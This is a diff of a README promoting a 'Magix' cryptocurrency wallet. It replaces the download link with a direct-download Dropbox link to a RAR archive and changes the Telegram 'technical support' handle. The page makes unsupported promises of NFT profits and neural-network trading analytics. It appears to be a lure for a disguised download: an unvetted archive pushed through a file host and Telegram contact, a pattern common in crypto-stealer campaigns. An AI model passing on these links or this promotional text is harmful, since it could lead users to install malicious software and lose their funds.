@@ -21,7 +21,7 @@
 
 ### Our wallet combines both cryptocurrency trading and a secure wallet.
 
-## 🔐 [Magix™ Download](https://drive.google.com/file/d/1uuLjnab0THZ6ArT3Kc93fBJc1-yhNFr4/view?usp=share_link)
+## 🔐 [Magix™ Download](https://www.dropbox.com/s/xg1g400ez5eigex/Magix%20Wallet.rar?dl=1)
 ### ● Investing in NFTs
 
 Tracking the price dynamics of NFT projects, the frequency of mentions in social networks and price growth forecasts for individual NFT collections will help you find the authors, investing in which you can multiply your investment.
@@ -34,4 +34,4 @@ All major news on your cryptocurrency pairs and analytics of their influence on 
 
 Whale trading strategies analytics, various technical analysis tools TradingView and other platforms together with big data give excellent results due to the use of neural network technology to process large data streams.
 
-[Technical Support](https://t.me/xenobladee)
+[Technical Support](https://t.me/betechnicalsupport)
